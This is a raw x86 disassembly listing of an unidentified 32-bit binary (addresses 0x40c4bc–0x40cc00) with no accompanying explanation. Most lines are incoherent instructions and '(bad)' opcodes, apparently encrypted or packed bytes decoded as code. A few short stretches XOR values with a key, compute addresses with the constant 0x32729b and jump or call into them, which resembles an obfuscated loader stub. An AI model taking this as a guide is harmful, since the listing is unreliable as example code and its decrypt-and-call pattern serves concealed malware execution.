  40c4bc:	lock mov WORD PTR [ecx-0x7e],ds
  40c4c0:	les    ecx,FWORD PTR [edi+edx*1]
  40c4c3:	inc    ebx
  40c4c4:	mov    eax,0xa30e27de
  40c4c9:	dec    eax
  40c4ca:	xor    DWORD PTR [edi+0x6c],ebp
  40c4cd:	clc    
  40c4ce:	ds repz pop ebp
  40c4d1:	popf   
  40c4d2:	nop
  40c4d3:	cs sahf 
  40c4d5:	aad    0x79
  40c4d7:	mov    ?,WORD PTR [eax+0x35a3dd44]
  40c4dd:	dec    edi
  40c4de:	out    0xbc,eax
  40c4e0:	add    al,0xea
  40c4e2:	mov    bh,0x55
  40c4e4:	gs cmp eax,0x32247e26
  40c4ea:	scas   al,BYTE PTR es:[edi]
  40c4eb:	stc    
  40c4ec:	xchg   BYTE PTR [ebx],ah
  40c4ee:	push   edx
  40c4ef:	mov    edi,0xe1ee5626
  40c4f4:	dec    ebx
  40c4f5:	mov    al,0x69
  40c4f7:	mov    ebp,0x551f5342
  40c4fc:	xchg   DWORD PTR [eax],ecx
  40c4fe:	mov    ah,0xa7
  40c500:	jl     0x40c48e
  40c502:	xor    BYTE PTR [ecx-0x68],bl
  40c505:	mov    dl,0xd7
  40c507:	clc    
  40c508:	fwait
  40c509:	jae    0x40c48c
  40c50b:	mov    esi,DWORD PTR ds:0xd0c7811f
  40c511:	fdiv   st(1),st
  40c513:	in     eax,dx
  40c514:	mov    ds:0x2f424612,eax
  40c519:	outs   dx,BYTE PTR ds:[esi]
  40c51a:	add    cl,bh
  40c51c:	dec    edi
  40c51d:	call   0xcda8:0x346c431
  40c524:	and    ah,BYTE PTR cs:[edx+0x69e3ec8]
  40c52b:	arpl   di,bx
  40c52d:	mov    ds:0xbc82f60e,al
  40c532:	inc    edx
  40c533:	cmp    bh,BYTE PTR ds:0x8c7a383b
  40c539:	loop   0x40c562
  40c53b:	mov    bh,0x73
  40c53d:	lods   al,BYTE PTR ds:[esi]
  40c53e:	mov    al,ds:0x937fe23a
  40c543:	mov    ebx,0x92003b9f
  40c548:	mov    ebp,DWORD PTR [ebx-0x289fa6dd]
  40c54e:	pop    ebx
  40c54f:	push   esi
  40c550:	pop    ebp
  40c551:	sbb    al,BYTE PTR [esi]
  40c553:	in     al,dx
  40c554:	loope  0x40c57f
  40c556:	out    0x67,eax
  40c558:	xlat   BYTE PTR ds:[ebx]
  40c559:	jg     0x40c507
  40c55b:	mov    al,0xc8
  40c55d:	imul   ebp,DWORD PTR [esi+0x54],0x95aff67c
  40c564:	xor    al,0x68
  40c566:	cdq    
  40c567:	pop    esp
  40c568:	fisttp WORD PTR [ebx+0x23]
  40c56b:	loope  0x40c561
  40c56d:	push   eax
  40c56e:	pop    edx
  40c56f:	pop    ecx
  40c570:	hlt    
  40c571:	out    0xbc,eax
  40c573:	dec    eax
  40c574:	xlat   BYTE PTR ds:[ebx]
  40c575:	push   ds
  40c576:	fcom   QWORD PTR [edx+0x6a]
  40c579:	sub    al,0x4
  40c57b:	and    al,0x20
  40c57d:	push   ds
  40c57e:	cmp    eax,0xc093a15e
  40c583:	icebp  
  40c584:	cwde   
  40c585:	pop    ebp
  40c586:	jnp    0x40c5d1
  40c588:	inc    ecx
  40c589:	add    eax,0x26ef0579
  40c58e:	stc    
  40c58f:	jg     0x40c557
  40c591:	aad    0x8a
  40c593:	jmp    ecx
  40c595:	fcom   DWORD PTR [esi+ebx*2]
  40c598:	and    BYTE PTR [edx],bl
  40c59a:	push   esi
  40c59b:	dec    ebp
  40c59c:	aad    0xb8
  40c59e:	mov    bh,0x1c
  40c5a0:	imul   eax,ecx,0xffffffe5
  40c5a3:	dec    edx
  40c5a4:	stc    
  40c5a5:	xchg   ecx,eax
  40c5a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5a7:	dec    edi
  40c5a8:	xchg   ebx,ebx
  40c5aa:	pop    edx
  40c5ab:	sbb    al,0xb0
  40c5ad:	dec    edx
  40c5ae:	sahf   
  40c5af:	not    DWORD PTR ds:0x92eb8901
  40c5b5:	leave  
  40c5b6:	xchg   esp,eax
  40c5b7:	add    al,0x21
  40c5b9:	and    al,0xbd
  40c5bb:	fimul  WORD PTR [esi-0x19]
  40c5be:	(bad)  
  40c5bf:	call   0xb668:0x3b10d817
  40c5c6:	in     eax,dx
  40c5c7:	xchg   edx,eax
  40c5c8:	xchg   ebp,eax
  40c5c9:	jne    0x40c629
  40c5cb:	repz or BYTE PTR [eax-0x56],0xb3
  40c5d0:	fld    st(5)
  40c5d2:	cld    
  40c5d3:	push   0xcfc2d243
  40c5d8:	jne    0x40c5c9
  40c5da:	mov    esi,DWORD PTR [edi+0x679f7bd9]
  40c5e0:	mov    ss,WORD PTR [edx]
  40c5e2:	ja     0x40c652
  40c5e4:	xchg   edx,eax
  40c5e5:	mov    esi,0xa423e575
  40c5ea:	sbb    esp,esi
  40c5ec:	cwde   
  40c5ed:	ins    DWORD PTR es:[edi],dx
  40c5ee:	les    edx,FWORD PTR [esi]
  40c5f0:	pop    edi
  40c5f1:	lock add al,0xa0
  40c5f4:	sahf   
  40c5f5:	inc    ebp
  40c5f6:	ss xchg esi,ebx
  40c5f9:	mov    esi,0x3a926ec1
  40c5fe:	shl    edx,0xc2
  40c601:	push   eax
  40c602:	les    esi,FWORD PTR [ebx+0x3]
  40c605:	repnz mov ds:0xffff96cb,eax
  40c60b:	cmp    edx,esp
  40c60d:	out    0x28,eax
  40c60f:	and    dl,BYTE PTR [ebx-0x43ed101a]
  40c615:	sar    BYTE PTR [ebx-0x4098a76d],1
  40c61b:	gs ret 
  40c61d:	in     al,dx
  40c61e:	jne    0x40c646
  40c620:	in     eax,dx
  40c621:	hlt    
  40c622:	push   ebx
  40c623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c624:	sbb    dl,ah
  40c626:	gs in  al,0xcb
  40c629:	mov    ch,0x93
  40c62b:	rcr    ah,0x7b
  40c62e:	in     eax,0x1d
  40c630:	and    eax,0xa9b4ea2c
  40c635:	sub    BYTE PTR [ecx+0x44],al
  40c638:	leave  
  40c639:	lods   al,BYTE PTR ds:[esi]
  40c63a:	test   al,0x1e
  40c63c:	and    al,0x15
  40c63e:	stc    
  40c63f:	test   BYTE PTR [edx+esi*4],ah
  40c642:	inc    esp
  40c643:	in     eax,0x81
  40c645:	cmp    BYTE PTR [eax],bl
  40c647:	xor    BYTE PTR [ecx+0x63],bl
  40c64a:	ins    BYTE PTR es:[edi],dx
  40c64b:	inc    edx
  40c64c:	pop    esi
  40c64d:	inc    ecx
  40c64e:	test   esp,ebx
  40c650:	jecxz  0x40c68f
  40c652:	sbb    ah,BYTE PTR [ebx]
  40c654:	mov    ds:0x2fb637bf,al
  40c659:	test   al,0xc7
  40c65b:	les    ebp,FWORD PTR [ecx+0x67f2fee0]
  40c661:	cdq    
  40c662:	test   DWORD PTR [eax-0x7a47550e],ebp
  40c668:	jb     0x40c64b
  40c66a:	jl     0x40c60b
  40c66c:	(bad)  
  40c66e:	das    
  40c66f:	mov    edi,0x1e5a811b
  40c674:	add    bh,BYTE PTR [eax]
  40c676:	std    
  40c677:	adc    al,0x75
  40c679:	pop    edx
  40c67a:	ret    
  40c67b:	xchg   edi,eax
  40c67c:	mov    ecx,0xfc03a7ee
  40c681:	sahf   
  40c682:	add    bh,BYTE PTR [edi-0x265e3772]
  40c688:	lock and ebp,DWORD PTR [edi]
  40c68b:	mov    WORD PTR [ecx],?
  40c68d:	mov    BYTE PTR [esp+ecx*2+0x78],0xb4
  40c692:	leave  
  40c693:	mov    ch,0x6b
  40c695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c696:	mov    ah,0xb3
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0x3a989ac1],dl
  40c6de:	mov    bh,0xa1
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	jns    0x40c750
  40c6ea:	dec    eax
  40c6eb:	pushf  
  40c6ec:	shr    BYTE PTR [ecx+0x52],0x57
  40c6f0:	and    edx,DWORD PTR [edi+0x4f]
  40c6f3:	aam    0x90
  40c6f5:	ins    BYTE PTR es:[edi],dx
  40c6f6:	lock add al,0xc9
  40c6f9:	daa    
  40c6fa:	mov    al,ds:0x9da8d5bc
  40c6ff:	adc    eax,DWORD PTR [edx]
  40c701:	mov    ds:0xd7aa8936,eax
  40c706:	mov    ah,0xb
  40c708:	push   eax
  40c709:	int    0x30
  40c70b:	and    al,0x98
  40c70d:	sbb    BYTE PTR [ebx+0x3b4190fd],0x62
  40c714:	adc    BYTE PTR [edx+0x17],ah
  40c717:	sbb    eax,0x22657f5e
  40c71c:	adc    ah,cl
  40c71e:	add    DWORD PTR [eax-0x433ac6c7],esi
  40c724:	add    bl,BYTE PTR ds:0xeeac0781
  40c72a:	out    dx,al
  40c72b:	or     ah,0x44
  40c72e:	out    dx,eax
  40c72f:	loop   0x40c7ab
  40c731:	xchg   ebx,eax
  40c732:	and    al,dh
  40c734:	out    0x75,eax
  40c736:	sub    al,dh
  40c738:	mov    dl,0x4
  40c73a:	and    ch,BYTE PTR [ecx]
  40c73c:	pop    eax
  40c73d:	popf   
  40c73e:	clc    
  40c73f:	mov    dl,0x2c
  40c741:	inc    ebp
  40c742:	inc    ebp
  40c743:	or     ebp,DWORD PTR [ebp+0x1de3974b]
  40c749:	or     edi,DWORD PTR [ecx]
  40c74b:	and    bh,ah
  40c74d:	dec    esp
  40c74e:	cwde   
  40c74f:	test   DWORD PTR [ebp+ebx*2+0x9],0xbf91e7bc
  40c757:	lahf   
  40c758:	fidiv  WORD PTR [eiz*2+0x781e09cb]
  40c75f:	and    eax,0x7c25138
  40c764:	mov    DWORD PTR [esi+0x3a],edi
  40c767:	mov    esp,0x898e273f
  40c76c:	call   0xd85:0x76ce43a7
  40c773:	push   ss
  40c774:	push   edi
  40c775:	sbb    esp,ebx
  40c777:	icebp  
  40c778:	enter  0x423c,0xc9
  40c77c:	fs lock aad 0x98
  40c780:	mov    al,ch
  40c782:	push   eax
  40c783:	repz jb 0x40c75c
  40c786:	mov    cl,0x1e
  40c788:	ficom  WORD PTR [edx]
  40c78a:	test   dl,dh
  40c78c:	dec    edi
  40c78d:	ins    BYTE PTR es:[edi],dx
  40c78e:	mov    esi,0xdf55ee13
  40c793:	inc    ecx
  40c794:	lds    edx,FWORD PTR fs:[eax+0x502a75a5]
  40c79b:	add    bl,bl
  40c79d:	loope  0x40c75f
  40c79f:	out    0x58,eax
  40c7a1:	mul    eax
  40c7a3:	rcr    BYTE PTR [eax],0xfa
  40c7a6:	(bad)
  40c7a9:	jb     0x40c7d9
  40c7ab:	xor    eax,0xba5a0aff
  40c7b0:	stos   BYTE PTR es:[edi],al
  40c7b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7b2:	cmp    DWORD PTR [edi],edx
  40c7b4:	imul   edi,DWORD PTR [eax],0x5c
  40c7b7:	mov    dh,0x1
  40c7b9:	mov    ah,0xf7
  40c7bb:	lds    esp,FWORD PTR [eax]
  40c7bd:	retf   
  40c7be:	(bad)  
  40c7c0:	inc    eax
  40c7c1:	jle    0x40c7dc
  40c7c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7c4:	inc    esi
  40c7c5:	jl     0x40c831
  40c7c7:	xor    eax,0x438ad3c9
  40c7cc:	xchg   ebp,eax
  40c7cd:	pop    ebp
  40c7ce:	or     BYTE PTR [edi-0x1a],ah
  40c7d1:	jnp    0x40c7be
  40c7d3:	xor    dl,cl
  40c7d5:	adc    BYTE PTR [ecx-0x369cad9d],0xd7
  40c7dc:	popa   
  40c7dd:	stc    
  40c7de:	push   edx
  40c7df:	imul   ecx,DWORD PTR ds:0xb10d51c7,0x54110449
  40c7e9:	xor    ah,bh
  40c7eb:	sbb    ebx,DWORD PTR [ecx-0x109d6544]
  40c7f1:	xchg   esi,eax
  40c7f2:	(bad)  
  40c7f3:	jmp    0x3b8ce457
  40c7f8:	pop    eax
  40c7f9:	lods   eax,DWORD PTR ds:[esi]
  40c7fa:	(bad)  
  40c7fb:	in     al,0xc9
  40c7fd:	mov    ds:0xb37873b8,al
  40c802:	xor    ebx,DWORD PTR [ebp+eax*2-0x77296f9e]
  40c809:	or     bl,0x86
  40c80c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c80d:	jb     0x40c7d8
  40c80f:	cmp    al,BYTE PTR [eax-0x12202ecc]
  40c815:	add    DWORD PTR [edi],esi
  40c817:	adc    eax,0x2cd2ba38
  40c81c:	in     eax,0xff
  40c81e:	dec    esp
  40c81f:	jmp    FWORD PTR [eax-0x5af2eecc]
  40c825:	repz out 0x11,al
  40c828:	std    
  40c829:	stos   DWORD PTR es:[edi],eax
  40c82a:	lds    ecx,FWORD PTR [ebx+ecx*2+0x3f]
  40c82e:	xchg   esi,eax
  40c82f:	fisubr DWORD PTR [ecx]
  40c831:	icebp  
  40c832:	gs sahf 
  40c834:	(bad)  
  40c836:	mov    ecx,0xd0087e5f
  40c83b:	lock pop ebx
  40c83d:	in     eax,dx
  40c83e:	call   0x3d510822
  40c843:	(bad)  
  40c844:	outs   dx,DWORD PTR ds:[esi]
  40c845:	in     eax,dx
  40c846:	pop    edi
  40c847:	jg     0x40c8ba
  40c849:	mov    ds:0xb9866fcc,al
  40c84e:	dec    ebp
  40c84f:	cs push ebp
  40c851:	add    ah,BYTE PTR [eax]
  40c853:	test   eax,0xbd2961a5
  40c858:	leave  
  40c859:	or     DWORD PTR [esi-0x35120415],ebp
  40c85f:	cmp    ch,BYTE PTR [ecx+0x766f139d]
  40c865:	test   esi,eax
  40c867:	pushf  
  40c868:	fwait
  40c869:	retf   0xc7c6
  40c86c:	or     ecx,eax
  40c86e:	clc    
  40c86f:	sub    bl,BYTE PTR [edi+eax*4+0x589af8a7]
  40c876:	and    edx,DWORD PTR [ebx]
  40c878:	repz push ds
  40c87a:	in     eax,0x97
  40c87c:	xchg   edi,eax
  40c87d:	push   eax
  40c87e:	push   0x8d5e3163
  40c883:	and    eax,edi
  40c885:	js     0x40c83e
  40c887:	jl     0x40c80d
  40c889:	inc    edx
  40c88a:	xlat   BYTE PTR ds:[ebx]
  40c88b:	loope  0x40c81a
  40c88d:	shl    dl,0x3
  40c890:	enter  0x9350,0xe2
  40c894:	stos   DWORD PTR es:[edi],eax
  40c895:	dec    ebp
  40c896:	push   edx
  40c897:	and    BYTE PTR [edi-0x78820560],bh
  40c89d:	and    DWORD PTR [esi-0x34f49150],eax
  40c8a3:	xchg   esp,eax
  40c8a4:	add    bl,BYTE PTR [esi+ebp*4]
  40c8a7:	mov    esi,0x2cffd811
  40c8ac:	jp     0x40c8e5
  40c8ae:	push   esp
  40c8af:	out    dx,eax
  40c8b0:	or     al,0x7f
  40c8b2:	pop    edi
  40c8b3:	data16 addr16 mov al,ds:0xbf30
  40c8b8:	sbb    al,0x75
  40c8ba:	add    bl,bh
  40c8bc:	cmp    al,0x80
  40c8be:	and    esi,DWORD PTR [ebx]
  40c8c0:	dec    ecx
  40c8c1:	add    bh,ah
  40c8c3:	fwait
  40c8c4:	lods   al,BYTE PTR ds:[esi]
  40c8c5:	pop    ebx
  40c8c6:	add    cl,BYTE PTR [ebx-0x1a424949]
  40c8cc:	loope  0x40c894
  40c8ce:	push   esi
  40c8cf:	pop    edx
  40c8d0:	add    edx,edx
  40c8d2:	push   0x28
  40c8d4:	mov    cl,0x20
  40c8d6:	sbb    al,0xfa
  40c8d8:	jb     0x40c85f
  40c8da:	jne    0x40c90e
  40c8dc:	lods   eax,DWORD PTR ds:[esi]
  40c8dd:	rcr    dh,1
  40c8df:	xor    BYTE PTR [eax+0x38],dl
  40c8e2:	popa   
  40c8e3:	jbe    0x40c90f
  40c8e5:	sub    bl,BYTE PTR [eax+0x5dcb0214]
  40c8eb:	ret    
  40c8ec:	div    DWORD PTR [eax+0x5fc0fe55]
  40c8f2:	jecxz  0x40c92d
  40c8f4:	stc    
  40c8f5:	(bad)  
  40c8f6:	mov    dl,0xa5
  40c8f8:	lods   al,BYTE PTR ds:[esi]
  40c8f9:	test   BYTE PTR [esi-0x568817ef],ch
  40c8ff:	dec    esi
  40c900:	rcl    DWORD PTR [eax-0x6b0ac9c1],0x58
  40c907:	ds dec esp
  40c909:	adc    edi,DWORD PTR [eax]
  40c90b:	imul   esi,DWORD PTR [ecx+0x721b68ac],0xccc2c811
  40c915:	xchg   ebx,eax
  40c916:	(bad)  
  40c917:	je     0x40c993
  40c919:	dec    ecx
  40c91a:	inc    esi
  40c91b:	rcl    DWORD PTR ds:0xa6428423,0xfe
  40c922:	push   esp
  40c923:	xor    al,0xb3
  40c925:	imul   edi,DWORD PTR [edi+ebx*2],0x41
  40c929:	cmp    eax,0x9d726c4d
  40c92e:	mov    edx,DWORD PTR [ebp+0x14]
  40c931:	xor    eax,ecx
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [esi-0x53],ebx
  40c946:	and    eax,0x7e8e988b
  40c94b:	jle    0x40c985
  40c94d:	jl     0x40c9cd
  40c94f:	jle    0x40c95d
  40c951:	aam    0x53
  40c953:	inc    eax
  40c954:	mov    DWORD PTR [ebx-0x21],edi
  40c957:	retf   0x45ca
  40c95a:	lods   eax,DWORD PTR ds:[esi]
  40c95b:	add    esp,ecx
  40c95d:	mov    cl,0x4d
  40c95f:	jg     0x40c965
  40c961:	xor    al,0x80
  40c963:	push   edi
  40c964:	test   BYTE PTR [eax-0x19473dbf],0x93
  40c96b:	adc    DWORD PTR [eax+0x7c],0xffffff9f
  40c96f:	inc    ecx
  40c970:	and    ah,bl
  40c972:	bswap  esi
  40c974:	xchg   ebx,eax
  40c975:	addr16 pop esi
  40c977:	shl    edi,0x15
  40c97a:	out    dx,eax
  40c97b:	out    0x89,eax
  40c97d:	(bad)  
  40c97e:	mov    esi,0x5b0d62ef
  40c983:	or     DWORD PTR [ebp+0x47],esp
  40c986:	sub    DWORD PTR [edx-0x55],0x9f32cf18
  40c98d:	rol    BYTE PTR [ebp+0xd],0x83
  40c991:	push   edx
  40c992:	cdq    
  40c993:	xor    edx,DWORD PTR [eax]
  40c995:	loope  0x40c999
  40c997:	push   ds
  40c998:	fsubr  st(7),st
  40c99a:	lds    eax,FWORD PTR [eax]
  40c99c:	fs std 
  40c99e:	test   eax,0xe4c86527
  40c9a3:	xlat   BYTE PTR ds:[ebx]
  40c9a4:	mov    bl,BYTE PTR [eax+0x31]
  40c9a7:	enter  0x2f17,0x57
  40c9ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9ac:	mov    ds:0x815ae2fd,al
  40c9b1:	mov    ebp,0xefee5442
  40c9b6:	xlat   BYTE PTR ds:[ebx]
  40c9b7:	xlat   BYTE PTR ds:[ebx]
  40c9b8:	sbb    al,0x19
  40c9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9bb:	loopne 0x40c9f9
  40c9bd:	sbb    esp,esi
  40c9bf:	jb     0x40c971
  40c9c1:	jnp    0x40c9a9
  40c9c3:	pop    ebp
  40c9c4:	(bad)  
  40c9c5:	jmp    0x40c9ef
  40c9c7:	cdq    
  40c9c8:	jb     0x40c97c
  40c9ca:	int3   
  40c9cb:	add    dl,BYTE PTR [ebx+0x64a1dbe4]
  40c9d1:	sahf   
  40c9d2:	push   es
  40c9d3:	push   esi
  40c9d4:	xchg   ebp,eax
  40c9d5:	add    edi,DWORD PTR [eax+0x49]
  40c9d8:	inc    ecx
  40c9d9:	and    al,0x81
  40c9db:	es push esi
  40c9dd:	enter  0xbb7b,0x8c
  40c9e1:	cdq    
  40c9e2:	scas   eax,DWORD PTR es:[edi]
  40c9e3:	retf   
  40c9e4:	out    dx,eax
  40c9e5:	dec    edx
  40c9e6:	fisub  DWORD PTR [ebp-0x70ae914b]
  40c9ec:	daa    
  40c9ed:	xor    cl,BYTE PTR [ebx]
  40c9ef:	fisubr DWORD PTR [edi+eiz*2]
  40c9f2:	rcl    BYTE PTR [ebp-0x5f],0xe6
  40c9f6:	cmp    dl,BYTE PTR [edx]
  40c9f8:	sub    dh,BYTE PTR [esi]
  40c9fa:	bnd jb 0x40ca30
  40c9fd:	and    bl,dl
  40c9ff:	sbb    DWORD PTR [eax-0x80],0xb35c4c49
  40ca06:	xchg   ebp,eax
  40ca07:	int3   
  40ca08:	cmp    BYTE PTR [edx],0xfa
  40ca0b:	dec    edi
  40ca0c:	test   DWORD PTR [ebx+ebp*8+0x6d],ecx
  40ca10:	dec    esp
  40ca11:	pop    ecx
  40ca12:	test   al,bh
  40ca14:	or     al,BYTE PTR ds:0xd5a63d0a
  40ca1a:	nop    DWORD PTR [ebx-0x5a]
  40ca1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca1f:	jno    0x40c9d7
  40ca21:	xlat   BYTE PTR ds:[ebx]
  40ca22:	cmc    
  40ca23:	test   DWORD PTR [eax+0x78],0x7da516c7
  40ca2a:	js     0x40ca96
  40ca2c:	ins    BYTE PTR es:[edi],dx
  40ca2d:	add    edx,edx
  40ca2f:	dec    eax
  40ca30:	adc    DWORD PTR [edx-0x73b0ba0a],ebp
  40ca36:	fiadd  DWORD PTR [eax-0x1eb3a8f]
  40ca3c:	clc    
  40ca3d:	fsub   QWORD PTR [ebp-0x74]
  40ca40:	arpl   bx,di
  40ca42:	mov    BYTE PTR [ecx*2+0x30d26566],cl
  40ca49:	xchg   edi,eax
  40ca4a:	jge    0x40ca8f
  40ca4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca4d:	xor    eax,0xb17267
  40ca52:	xchg   esp,eax
  40ca53:	jno    0x40ca95
  40ca55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca56:	add    dl,0xf2
  40ca59:	xor    esp,edx
  40ca5b:	mov    al,0x5d
  40ca5d:	outs   dx,BYTE PTR ds:[esi]
  40ca5e:	iret   
  40ca5f:	loop   0x40caa6
  40ca61:	pop    es
  40ca62:	jns    0x40ca8d
  40ca64:	out    0xb2,al
  40ca66:	idiv   BYTE PTR [edi+ebp*2]
  40ca69:	jnp    0x40ca87
  40ca6b:	rcl    BYTE PTR [edx-0xc325fe8],1
  40ca71:	(bad)  
  40ca72:	xchg   edx,eax
  40ca73:	inc    ecx
  40ca74:	or     ebx,ebp
  40ca76:	nop
  40ca77:	popa   
  40ca78:	repz sbb BYTE PTR [eax],bh
  40ca7b:	(bad)  
  40ca7c:	in     al,dx
  40ca7d:	dec    edi
  40ca7e:	cmp    cl,dl
  40ca80:	fnstsw WORD PTR [esi-0x22]
  40ca83:	jge    0x40ca81
  40ca85:	clc    
  40ca86:	xor    BYTE PTR [esi],ah
  40ca88:	xchg   edx,eax
  40ca89:	mov    ebp,0xa847d54f
  40ca8e:	dec    edi
  40ca8f:	jp     0x40cae7
  40ca91:	jmp    0x40caa8
  40ca93:	arpl   WORD PTR [esi],si
  40ca95:	mov    al,ds:0x4c749b9
  40ca9a:	xchg   esi,eax
  40ca9b:	fchs   
  40ca9d:	mov    dh,0xe0
  40ca9f:	or     al,0x96
  40caa1:	cwde   
  40caa2:	sbb    BYTE PTR [edi],ah
  40caa4:	(bad)  
  40caa6:	dec    ebx
  40caa7:	pop    esi
  40caa8:	test   BYTE PTR [ebx],0xd6
  40caab:	loop   0x40cb27
  40caad:	xor    esi,DWORD PTR [edx-0xd]
  40cab0:	sbb    edx,DWORD PTR [edx]
  40cab2:	pop    ebp
  40cab3:	jne    0x40cab9
  40cab5:	mov    al,0xd
  40cab7:	pusha  
  40cab8:	stc    
  40cab9:	lock je 0x40cae2
  40cabc:	mov    BYTE PTR [edx],al
  40cabe:	mov    gs,WORD PTR [ebx+0x1]
  40cac1:	loope  0x40cb09
  40cac3:	popa   
  40cac4:	jae    0x40caed
  40cac6:	mov    dh,BYTE PTR [eiz*2+0x35df1372]
  40cacd:	sbb    al,0xa6
  40cacf:	js     0x40cad8
  40cad1:	(bad)  
  40cad2:	sbb    eax,0x7f8fc85f
  40cad7:	cmp    DWORD PTR [ebx-0x3e],ebp
  40cada:	push   esp
  40cadb:	lods   eax,DWORD PTR ds:[esi]
  40cadc:	test   DWORD PTR [edi*8+0x3d3ce34],0x78bba73e
  40cae7:	inc    esp
  40cae8:	xchg   DWORD PTR [ebx-0x5c],edi
  40caeb:	scas   al,BYTE PTR es:[edi]
  40caec:	scas   eax,DWORD PTR es:[edi]
  40caed:	sti    
  40caee:	xchg   ebp,eax
  40caef:	mov    ch,0x83
  40caf1:	jge    0x40cb61
  40caf3:	test   DWORD PTR [esi+0xe81f3e5],esi
  40caf9:	test   eax,0x8d6a6579
  40cafe:	ins    BYTE PTR es:[edi],dx
  40caff:	lods   al,BYTE PTR ds:[esi]
  40cb00:	push   ebx
  40cb01:	test   eax,0x64dfb917
  40cb06:	push   cs
  40cb07:	data16 lahf 
  40cb09:	iret   
  40cb0a:	mov    al,0xa4
  40cb0c:	mov    al,0xd9
  40cb0e:	add    BYTE PTR [esp+ecx*4-0x721b3caf],cl
  40cb15:	sbb    BYTE PTR [edi+0x217755a7],dl
  40cb1b:	xchg   esi,eax
  40cb1c:	xadd   BYTE PTR [esi+eax*1+0x297a0127],dh
  40cb24:	sti    
  40cb25:	mov    ecx,0x1ce09e5
  40cb2a:	jecxz  0x40cadd
  40cb2c:	ror    cl,cl
  40cb2e:	inc    ebx
  40cb2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb30:	cmp    esp,esp
  40cb32:	rol    BYTE PTR [edx-0x10],0x40
  40cb36:	sub    al,0xf
  40cb38:	mov    eax,0x52399993
  40cb3d:	js     0x40cb3d
  40cb3f:	mul    ecx
  40cb41:	inc    esi
  40cb42:	test   al,0x5c
  40cb44:	adc    edx,0xfffffff1
  40cb47:	outs   dx,DWORD PTR ds:[esi]
  40cb48:	cmp    cl,BYTE PTR [edx+0x4007be99]
  40cb4e:	into   
  40cb4f:	inc    esi
  40cb50:	in     eax,dx
  40cb51:	xor    DWORD PTR [edi],edx
  40cb53:	cld    
  40cb54:	xor    BYTE PTR [esi-0x5d],dh
  40cb57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb58:	mov    ds:0x803968a0,al
  40cb5d:	test   eax,0xf22bf8f1
  40cb62:	les    esp,FWORD PTR [ebx-0x1750eb12]
  40cb68:	push   esp
  40cb69:	and    BYTE PTR [esi],bh
  40cb6b:	xor    DWORD PTR [edx+ebp*8-0x9],0xffffff8d
  40cb70:	jmp    0xa1af:0x2edd2615
  40cb77:	jle    0x40cb74
  40cb79:	jg     0x40cb4a
  40cb7b:	xchg   ebp,eax
  40cb7c:	cmp    bl,BYTE PTR [ebp+0x70ffcf01]
  40cb82:	xor    DWORD PTR [ebx-0x5f3e02ad],eax
  40cb88:	and    DWORD PTR [ecx-0x66e04103],esi
  40cb8e:	jg     0x40cbbe
  40cb90:	std    
  40cb91:	sub    dh,dh
  40cb93:	push   cs
  40cb94:	mov    ah,0xbb
  40cb96:	add    eax,esi
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x29]
  40cbfc:	jae    0x40cc3b
  40cbfe:	jo     0x40cc62
  40cc00:	mov    WORD PTR [esi+0x7e],?
